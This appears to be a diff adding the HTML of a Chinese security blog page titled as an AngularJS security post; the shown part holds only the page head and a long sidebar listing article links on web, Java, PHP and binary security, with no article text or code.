@@ -1,0 +1,1104 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+    
+      <link rel="icon" href="/kanxi.jpg">
+    
+
+    <title>
+        
+          浅析AngularJS安全 - Mi1k7ea
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="/css/spectre.min.css">
+    <link rel="stylesheet" href="/css/spectre-exp.min.css">
+    <link rel="stylesheet" href="/css/spectre-icons.min.css">
+
+    <!-- Noto Sans TC -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+TC" rel="stylesheet">
+    <!-- Noto Sans SC -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC" rel="stylesheet">
+    <!-- Noto Sans -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans" rel="stylesheet">
+
+    <!-- theme css & js -->
+    <link rel="stylesheet" href="/css/book.css">
+    <script src="/js/book.js"></script>
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('img')
+})
+</script>
+
+</head>
+
+<body>
+
+<div class="container">
+  <div class="book-container">
+    <div class="columns">
+      <div class="column col-2 hide-lg">
+        <div class="book-sidebar">
+  <h4 class="site-meta">
+    <a href="/">Mi1k7ea</a>
+  </h4>
+  <div class="sidebar-content">
+    <p>Good Good Study</p>
+<ul>
+<li><strong><a href="/archives">归档</a></strong></li>
+</ul>
+<hr>
+<ul>
+<li><strong>Web安全</strong><ul>
+<li>Web安全基础&amp;Tricks<ul>
+<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
+<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
+<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
+<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
+<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
+<li><a href="/2020/01/04/浅析XSSI漏洞/">浅析XSSI漏洞</a></li>
+<li><a href="/2020/03/11/浅析HRS漏洞/">浅析HRS漏洞</a></li>
+<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
+<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
+<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
+<li><a href="/2020/03/05/Redis安全小结/">Redis安全小结</a></li>
+<li><a href="/2020/02/29/SSRF-Tricks小结/">SSRF Tricks小结</a></li>
+<li><a href="/2020/01/21/CSRF-Tricks小结/">CSRF Tricks小结</a></li>
+<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
+<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
+<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
+<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
+<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
+<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
+<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
+<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
+<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
+<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
+<li><a href="/2020/01/26/浅析XSSJacking/">浅析XSSJacking</a></li>
+<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
+<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78716609" target="_blank" rel="noopener">(旧博客)Web安全加固小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78686832" target="_blank" rel="noopener">(旧博客)DoS与DDoS小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78301189" target="_blank" rel="noopener">(旧博客)MySQL数据库提权小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/69952026" target="_blank" rel="noopener">(旧博客)OWASP_top_10漏洞的总结笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76944203" target="_blank" rel="noopener">(旧博客)使用Docker搭建Nginx整数溢出漏洞（CVE-2017-7529）及Python PoC验证</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76862120" target="_blank" rel="noopener">(旧博客)使用Docker搭建Struts2-048漏洞环境及Python PoC验证</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76714002" target="_blank" rel="noopener">(旧博客)webshell的NTFS交换数据流文件隐藏及Python脚本查杀</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/59085529" target="_blank" rel="noopener">(旧博客)关于phpMyAdmin默认安装漏洞的学习笔记</a></li>
+</ul>
+</li>
+<li>Web安全之机器学习<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78457976" target="_blank" rel="noopener">(旧博客)机器学习应用之WebShell检测</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78298719" target="_blank" rel="noopener">(旧博客)数据挖掘之k-means算法的Python实现</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78012697" target="_blank" rel="noopener">(旧博客)数据挖掘之决策树归纳算法的Python实现</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78003975" target="_blank" rel="noopener">(旧博客)数据挖掘之Apriori算法的Python实现</a></li>
+</ul>
+</li>
+<li>WriteUp Web<ul>
+<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
+<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
+<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
+<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
+<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
+<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
+<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
+<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
+<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
+<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
+<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
+<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
+<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
+<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
+<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
+<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80306977" target="_blank" rel="noopener">(旧博客)通过Pentester_Lab学习XML注入</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/70168346" target="_blank" rel="noopener">(旧博客)Sqli-labs之Less1-10</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60882602" target="_blank" rel="noopener">(旧博客)DVWA之PHP文件包含漏洞（File Inclusion）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60477557" target="_blank" rel="noopener">(旧博客)通过DVWA学习CSRF漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60465854" target="_blank" rel="noopener">(旧博客)通过DVWA学习存储型XSS漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60359729" target="_blank" rel="noopener">(旧博客)通过DVWA学习反射型XSS漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/56307364" target="_blank" rel="noopener">(旧博客)通过DVWA学习SQL盲注</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/56279676" target="_blank" rel="noopener">(旧博客)通过DVWA学习SQL注入漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/54669614" target="_blank" rel="noopener">(旧博客)DVWA之PHP文件上传漏洞（File Upload）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/54630440" target="_blank" rel="noopener">(旧博客)通过DVWA学习命令执行漏洞（Command Execution）</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Java</strong><ul>
+<li>Java安全<ul>
+<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
+<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
+<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
+<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
+<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
+<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
+<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
+<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
+<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
+<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
+<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
+<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
+<li><a href="/2020/01/10/SpEL表达式注入漏洞总结/">SpEL表达式注入漏洞总结</a></li>
+<li><a href="/2020/03/16/OGNL表达式注入漏洞总结/">OGNL表达式注入漏洞总结</a></li>
+<li><a href="/2020/03/24/浅析Groovy代码注入漏洞/">浅析Groovy代码注入漏洞</a></li>
+<li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li>
+<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
+<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
+<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
+<li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li>
+<li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li>
+<li><a href="/2020/01/25/Java-Hessian反序列化漏洞/">Java Hessian反序列化漏洞</a></li>
+<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
+<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
+<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
+<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
+<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
+<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
+<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
+<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
+<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
+<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
+<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
+<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
+</ul>
+</li>
+<li>Struts2</li>
+<li>Spring<ul>
+<li><a href="/2019/01/01/Spring基础篇之基本概念/">Spring基础篇之基本概念</a></li>
+<li><a href="/2019/01/01/Spring基础篇之IoC容器/">Spring基础篇之IoC容器</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean/">Spring基础篇之Bean</a></li>
+<li><a href="/2019/01/01/Spring基础篇之DI（依赖注入）/">Spring基础篇之DI（依赖注入）</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean装配/">Spring基础篇之Bean装配</a></li>
+<li><a href="/2019/01/01/Spring基础篇之AOP/">Spring基础篇之AOP</a></li>
+<li><a href="/2019/01/01/Spring基础篇之JDBC框架/">Spring基础篇之JDBC框架</a></li>
+<li><a href="/2019/01/01/Spring基础篇之事务管理/">Spring基础篇之事务管理</a></li>
+<li><a href="/2020/01/16/Spring-MVC笔记/">Spring MVC笔记</a></li>
+<li><a href="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/">浅析自动绑定漏洞之Spring MVC</a></li>
+<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
+<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之CVE-2017-8046</a></li>
+<li><a href="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/">浅析Spring Data Commons之CVE-2018-1273</a></li>
+<li><a href="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/">浅析Spring Messaging之CVE-2018-1270</a></li>
+<li><a href="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/">浅析Spring Web Flow之CVE-2017-4971</a></li>
+<li><a href="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/">浅析Spring Security OAuth2之CVE-2016-4977</a></li>
+</ul>
+</li>
+<li>SpringCloud</li>
+</ul>
+</li>
+<li><strong>PHP</strong><ul>
+<li>PHP安全<ul>
+<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
+<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
+<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
+<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
+<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
+<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
+<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
+<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
+<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
+<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
+<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
+<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
+<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
+<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
+<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
+<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
+<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
+<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/70228700" target="_blank" rel="noopener">(旧博客)PHP代码审计之基础篇</a></li>
+</ul>
+</li>
+<li>CMS<ul>
+<li><a href="/2019/01/02/PHP代码审计实战之盾灵CMS/">PHP代码审计实战之盾灵CMS</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78358332" target="_blank" rel="noopener">(旧博客)PHP代码审计实战之MetInfo CMS</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78304692" target="_blank" rel="noopener">(旧博客)PHP代码审计实战之XDcms</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Python</strong><ul>
+<li>Python安全<ul>
+<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
+<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
+<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
+<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
+<li><a href="/2020/03/09/Python-urllib-CRLF注入漏洞小结/">Python urllib CRLF注入漏洞小结</a></li>
+</ul>
+</li>
+<li>安全开发<ul>
+<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
+<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78705998" target="_blank" rel="noopener">(旧博客)Python安全小工具之日志分析识别AWVS扫描</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78445866" target="_blank" rel="noopener">(旧博客)Python安全小工具之Linux日志痕迹清除</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78443601" target="_blank" rel="noopener">(旧博客)Python安全小工具之Web目录扫描器</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78003891" target="_blank" rel="noopener">(旧博客)Python安全小工具之计算文件Hash值</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78003609" target="_blank" rel="noopener">(旧博客)Python安全小工具之生成高精度字典</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/72972238" target="_blank" rel="noopener">(旧博客)关于《Python绝技：运用Python成为顶级黑客》的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/71152826" target="_blank" rel="noopener">(旧博客)关于《Python黑帽子：黑客与渗透测试编程之道》的学习笔记</a></li>
+</ul>
+</li>
+<li>爬虫<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/68961258" target="_blank" rel="noopener">(旧博客)Python爬虫之基础篇</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78411824" target="_blank" rel="noopener">(旧博客)Python爬虫之爬取动态页面数据</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78840444" target="_blank" rel="noopener">(旧博客)Python爬虫之Scrapy爬虫框架</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78850550" target="_blank" rel="noopener">(旧博客)Python爬虫之分布式爬虫</a></li>
+</ul>
+</li>
+<li>Django<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78505235" target="_blank" rel="noopener">(旧博客)基于Django搭建简单的博客系统</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>JavaScript</strong><ul>
+<li>JavaScript安全<ul>
+<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
+</ul>
+</li>
+<li>Node.js<ul>
+<li><a href="/2020/03/29/浅析Node-js安全/">浅析Node.js安全</a></li>
+<li><a href="/2020/03/29/node-serialize反序列化漏洞/">node-serialize反序列化漏洞</a></li>
+</ul>
+</li>
+<li>AngularJS<ul>
+<li><a href="/2020/03/29/浅析AngularJS安全/">浅析AngularJS安全</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>GO</strong><ul>
+<li>GO安全<ul>
+<li><a href="/2020/01/01/浅析Influxdb认证绕过漏洞/">浅析Influxdb认证绕过漏洞</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>二进制安全</strong><ul>
+<li>二进制基础<ul>
+<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
+<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
+<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
+<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
+<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
+<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
+<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
+</ul>
+</li>
+<li>C/C++<ul>
+<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
+</ul>
+</li>
+<li>逆向工程<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80334012" target="_blank" rel="noopener">(旧博客)逆向分析HelloWorld程序</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80380974" target="_blank" rel="noopener">(旧博客)逆向分析abex’crackme#1</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80546988" target="_blank" rel="noopener">(旧博客)逆向分析abex’crackme #2</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80549743" target="_blank" rel="noopener">(旧博客)函数调用约定</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80554677" target="_blank" rel="noopener">(旧博客)栈帧</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80558193" target="_blank" rel="noopener">(旧博客)逆向分析Tut.ReverseMe1</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80571933" target="_blank" rel="noopener">(旧博客)PE文件格式</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80611969" target="_blank" rel="noopener">(旧博客)运行时压缩（UPX）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80636568" target="_blank" rel="noopener">(旧博客)基址重定位表</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80636900" target="_blank" rel="noopener">(旧博客)从可执行文件中删除.reloc节区</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80656921" target="_blank" rel="noopener">(旧博客)UPack的PE文件头分析与OEP查找</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80670045" target="_blank" rel="noopener">(旧博客)内嵌补丁练习</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80684358" target="_blank" rel="noopener">(旧博客)Windows消息钩取</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80777748" target="_blank" rel="noopener">(旧博客)DLL注入</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80780830" target="_blank" rel="noopener">(旧博客)DLL卸载</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80789234" target="_blank" rel="noopener">(旧博客)通过修改PE加载DLL</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/82947635" target="_blank" rel="noopener">(旧博客)代码注入（线程注入）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/82954890" target="_blank" rel="noopener">(旧博客)使用汇编语言编写注入代码</a></li>
+</ul>
+</li>
+<li>Fuzzing<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80950537" target="_blank" rel="noopener">(旧博客)Windows缓冲区溢出之SLMail</a></li>
+</ul>
+</li>
+<li>Pwn<ul>
+<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
+<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
+<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
+<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
+<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
+<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
+<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
+<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
+</ul>
+</li>
+<li>WriteUp Pwn<ul>
+<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
+</ul>
+</li>
+<li>WriteUp Reverse<ul>
+<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>渗透测试</strong><ul>
+<li>基础&amp;Tricks<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63681200" target="_blank" rel="noopener">(旧博客)被动信息收集之DNS信息收集</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63681596" target="_blank" rel="noopener">(旧博客)被动信息收集之RECON-NG</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63682444" target="_blank" rel="noopener">(旧博客)主动信息收集之主机发现</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63684778" target="_blank" rel="noopener">(旧博客)主动信息收集之主机发现的一些脚本</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/64906997" target="_blank" rel="noopener">(旧博客)主动信息收集之端口扫描</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/66473045" target="_blank" rel="noopener">(旧博客)主动信息收集之端口扫描的一些脚本</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78301318" target="_blank" rel="noopener">(旧博客)渗透测试之漏洞扫描阶段</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/57405291" target="_blank" rel="noopener">(旧博客)在Windows和Linux系统下隐藏痕迹的小技巧</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/57403811" target="_blank" rel="noopener">(旧博客)在Windows和Linux系统中的一些信息收集方法</a></li>
+</ul>
+</li>
+<li>Kali<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76598873" target="_blank" rel="noopener">(旧博客)使用Kali无线渗透获取宿舍WiFi密码（WPA）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62239673" target="_blank" rel="noopener">(旧博客)关于Kali的两个Webshell（Webacoo和Weevely）的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62064984" target="_blank" rel="noopener">(旧博客)关于Kali获取HTTP账号密码的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62045632" target="_blank" rel="noopener">(旧博客)关于Kali进行ARP欺骗的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61926977" target="_blank" rel="noopener">(旧博客)关于Kali进行ARP攻击的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61920179" target="_blank" rel="noopener">(旧博客)在Kali中安装IBus的拼音输入法</a></li>
+<li></li>
+</ul>
+</li>
+<li>Metasploit<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60881390" target="_blank" rel="noopener">(旧博客)关于Metasploit的学习笔记（一）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/62427016" target="_blank" rel="noopener">(旧博客)关于Metasploit的学习笔记（二）</a></li>
